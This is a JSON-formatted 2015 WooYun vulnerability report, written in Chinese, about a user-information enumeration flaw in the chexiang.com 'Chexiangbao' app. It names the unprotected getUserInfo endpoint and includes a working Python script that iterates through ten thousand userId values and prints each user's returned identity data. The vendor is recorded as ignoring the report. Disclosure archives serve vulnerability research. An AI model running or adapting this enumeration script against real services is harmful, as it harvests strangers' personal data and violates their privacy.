{"id": 69011, "wybug_id": "wooyun-2015-0147952", "wybug_title": "车享网用户信息遍历漏洞", "wybug_corp": "chexiang.com", "wybug_author": "路人甲", "wybug_date": "2015-10-20 10:04", "wybug_open_date": "2015-10-25 10:06", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄露", "用户敏感信息泄漏"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-25：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： -。- 详细说明：  车享网App车享宝存在如下接口：http://cxb.chexiang.com//service/userCenter/getUserInfo/0在用户登录过程中，此接口根据post请求的userId参数返回用户的身份信息。但是userId未进行严格控制，导致可通过此接口遍历所有用户.   漏洞证明：  0x01.手工获取其他用户信息.\n\n\n\n\n\n0x02.脚本利用.\n#!/usr/bin/env python# coding: utf-8'''cxb.chexiang.com[*] user traversal'''import requestsimport jsondef get_headers():    headers = {}    headers[\"Accept-Encoding\"] = '*'    headers[\"saikemobilehead\"] = {        \"appCode\":\"MongoToC\",        \"appVersion\":\"2.6.0\",        \"clientId\":\"**此处隐去**\",        \"deviceId\":\"**此处隐去**\",        \"deviceManufacturer\":\"Xiaomi\",        \"plateformType\":\"android\",        \"sourceCode\":\"CXB0000\",        \"userAccount\":\"login user account\",        \"userToken\":\"**此处隐去**\"    }    headers[\"Accept-Language\"] = 'zh-cn,zh'    headers[\"Accept-Charset\"] = 'utf-8'    headers[\"Content-type\"] = 'application/json'    headers[\"Connection\"] = 'close'    headers[\"User-Agent\"] = \"Dalvik/1.6.0 (Linux; U; Android 4.4.4; HM 2A MIUI/V6.7.2.0.KHLCNCH)\"    headers[\"Host\"] = 'cxb.chexiang.com'    return headersdef get_post_data(user_id):    post_data = {}    post_data[\"userId\"] = user_id    return post_datadef get_url():    url = \"http://cxb.chexiang.com/service/userCenter/getUserInfo/0\"    return urldef user_traver():    atk_url = get_url()    headers = get_headers()    for id in range(3320000, 3330000):        post_data = get_post_data(id)        post_data = json.dumps(post_data)        resp = requests.post(atk_url, data=post_data, headers=headers)        print resp.json()        printif __name__ == '__main__':    user_traver()\n如下是脚本遍历的部分结果.\n\n   修复方案：  Null   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-10-25 10:06 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}